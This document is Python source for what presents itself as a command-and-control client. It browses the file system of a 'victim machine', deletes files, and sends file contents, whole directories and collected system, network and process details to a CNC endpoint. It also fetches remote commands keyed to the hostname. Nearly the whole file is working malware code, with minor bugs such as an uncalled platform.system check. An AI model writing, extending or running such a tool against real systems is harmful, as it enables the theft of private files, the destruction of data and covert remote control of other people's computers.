import os,time
import tkinter.filedialog as fd
import requests
import os.path as path
from pprint import pprint
import colorama 
import subprocess,socket,sys
import string,psutil
import platform
from tabulate import tabulate
from colorama import Fore,Style
colorama.init()





def gather_linux_info():
    info = ''
    
    # System Information
    info += f'System: {platform.system()} {platform.release()} {platform.machine()}\n'
    
    # Hostname
    hostname = socket.gethostname()
    info += f'Hostname: {hostname}\n'
    
    # CPU Information
    cpu_info = platform.processor()
    info += f'CPU Info: {cpu_info}\n'
    
    # Memory Information
    mem_info = psutil.virtual_memory()
    info += f'Memory Info:\nTotal: {mem_info.total / (1024.0 ** 3):.2f} GB\nAvailable: {mem_info.available / (1024.0 ** 3):.2f} GB\n'
    
    # Disk Usage
    disk_usage = psutil.disk_usage('/')
    info += f'Disk Usage:\nTotal: {disk_usage.total / (1024.0 ** 3):.2f} GB\nUsed: {disk_usage.used / (1024.0 ** 3):.2f} GB\nFree: {disk_usage.free / (1024.0 ** 3):.2f} GB\n'
    
    # Network Interfaces
    net_info = psutil.net_if_addrs()
    info += 'Network Interfaces:\n'
    for interface, addresses in net_info.items():
        info += f'  {interface}\n'
        for address in addresses:
            if address.family == socket.AF_INET:
                info += f'    IPv4 Address: {address.address}\n'
            elif address.family == socket.AF_INET6:
                info += f'    IPv6 Address: {address.address}\n'
    
    # System Load
    load_avg = psutil.getloadavg()
    info += f'System Load: {load_avg[0]:.2f}, {load_avg[1]:.2f}, {load_avg[2]:.2f}\n'
    
    # Processes
    processes = psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent'])
    info += 'Processes:\n'
    for process in processes:
        try:
            process_info = process.info
            info += f'  PID: {process_info["pid"]} Name: {process_info["name"]} User: {process_info["username"]} CPU%: {process_info["cpu_percent"]:.2f} Memory%: {process_info["memory_percent"]:.2f}\n'
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    return info



ENDPOINT = 'http://127.0.0.1:8000'
def writetofile(error:str):
        with open("erors.txt",'a',encoding='utf-8')as e:
            e.write(str(error)+"\n")



class FileDialog:
    def __init__(self):
        self.commands =[["[file] --remove","deletes the selected file"],["[file] --read","prints the contents of the file"],["[file] --upload",'uploads the selected file to your machine']]


    def removefile(self,filepath):
        try:
                os.remove(filepath)
                print(Fore.GREEN+f"[CNC]:removed file {filepath} successfully")
        except Exception as e:
            writetofile(e)

    def uploadfile(self,filepath):
        try:
            if os.path.isfile(filepath):
                try:
                    with open(filepath,"rb") as b:
                        r = requests.post(f"{ENDPOINT}/api/recive/payload",files={"File_param":b})
                        if r.status_code == 200:
                            print(Fore.GREEN+f"[CNC]:file {filepath} Is being uploaded or uploaded")
                except Exception as e:
                    writetofile(e)
        except Exception as e:
                    writetofile(e)

    def manageupload(self,filepath):
        try:    
            if path.isdir(filepath):
                r = input("this will upload all file and subdirs in the directory that you selected do you want to proceed [y,n]?").lower()
                if r =='y':
                    for file in os.listdir(filepath):
                        floader = path.join(filepath,file)
                        self.manageupload(floader)
            else:
                self.uploadfile(filepath)

        except Exception as e:
            writetofile(e)

    def readfile(self,filepath):
        try:
            if platform.system() == "Linux":
                cmd = ['cat',filepath]
            elif platform.system() == "Windows":
                cmd = ['type',filepath]

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            if err:
                text =("Error occurred while executing the command")
            else:
                text = out.decode()
            data = {
                "data":text,
                "file_name":filepath
                }
            
            r = requests.post(f"{ENDPOINT}/api/recive/text",json=data)
        except Exception as e:
            writetofile(e)

    def dostufftofile(self,base,filepath,cmd):
        if cmd == "remove":
            self.removefile(filepath=filepath)
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "help":
            help = []
            help.append([Fore.RED +"--help"+ Style.RESET_ALL, Fore.RED + "shows this message" + Style.RESET_ALL])
            help.append([Fore.RED +"[dir] --walk"+ Style.RESET_ALL, Fore.RED + "walks to the choosen dir" + Style.RESET_ALL])
            help.append([Fore.RED +"--back"+ Style.RESET_ALL, Fore.RED + "walks to the parent dir" + Style.RESET_ALL])
            help.append([Fore.RED +"[file] --read"+ Style.RESET_ALL, Fore.RED + "reads the contents of the file" + Style.RESET_ALL])
            help.append([Fore.RED +"--upload"+ Style.RESET_ALL, Fore.RED + "uploads the file from the victim machine to the CNC" + Style.RESET_ALL])
            help.append([Fore.RED +"--power"+ Style.RESET_ALL, Fore.RED + "makes a shell to execute commands remotely from the CNC" + Style.RESET_ALL])
            help.append([Fore.RED +"[file or dir] --remove"+ Style.RESET_ALL, Fore.RED + "--remove: deletes the choosen file or dir" + Style.RESET_ALL])
            


            help_table = tabulate(help, headers=["command", "description"], tablefmt="fancy_grid")
            print(help_table)
            input("press anything to returns to the file manager")
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "upload" and ENDPOINT != None:
            self.manageupload(filepath)
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "read":
            self.readfile(filepath)
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "walk":
            if path.isdir(filepath):
                self.searchfiles(filepath)
            else:
                print("you cant walk a file it must be a dir")
                time.sleep(2)
                self.searchfiles(os.path.dirname(filepath))

        elif cmd == "back":
            try:
                self.searchfiles(os.path.dirname(base))
            except Exception as e:
                print(e)
        elif cmd == "info":
            
            Userdata = gather_linux_info()
            try:
                data = {
                    "data":str(Userdata),
                    "file_name":"victim_Info"
                    }
                
                r = requests.post(f"{ENDPOINT}/api/recive/text",json=data)
            except Exception as e:
                writetofile(e)
            
        elif cmd == "power":
            r =  requests.get(ENDPOINT+f"/api/commands/recive/{socket.gethostname()}")
            cmd = r.json()
            print(cmd)



        

            


    

    def searchfiles(self,folder_path):
        if platform.system() == "Linux":
            os.system("clear")
        elif platform.system() == "Windows":
            os.system("cls")

        try:
            Files = {}
            data = []
            for file_or_folder in os.listdir(folder_path):
                floder =path.join(folder_path ,file_or_folder)
                file_type = "File" if os.path.isfile(floder) else "Folder"
                if file_type == "File":
                    Files[file_or_folder] = "File"
                    data.append([Fore.RED +file_or_folder+ Style.RESET_ALL, Fore.RED + file_type + Style.RESET_ALL])        
                else:
                    Files[file_or_folder] = "Folder "
                    data.append([Fore.BLUE + file_or_folder + Style.RESET_ALL, Fore.BLUE + file_type + Style.RESET_ALL])        

            table = tabulate(data, headers=["Name", "Type"], tablefmt="fancy_grid")
            print(table)

            inp = input(f"\n\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Filemanager: ")
            try:
                cmd = inp.split("--")[1]
            except:
                print("You have to add a Command")
            filename = inp.split("--")[0].strip(" ")
            floder =path.join(folder_path ,filename)
            print(f"CMD:{cmd} || filepath:{floder} || ENDPOINT:{ENDPOINT}")
            self.dostufftofile(base=folder_path,cmd=cmd,filepath=floder)
            
        

        except Exception as e:
            writetofile(e)                
                    

#print(fd.askdirectory())



APP = FileDialog()
    
while True:
    if platform.system == "Linux":
        try:
            APP.searchfiles('/')
        except Exception as e:
            writetofile(e)
    else:
        APP.searchfiles(os.path.expanduser("~"))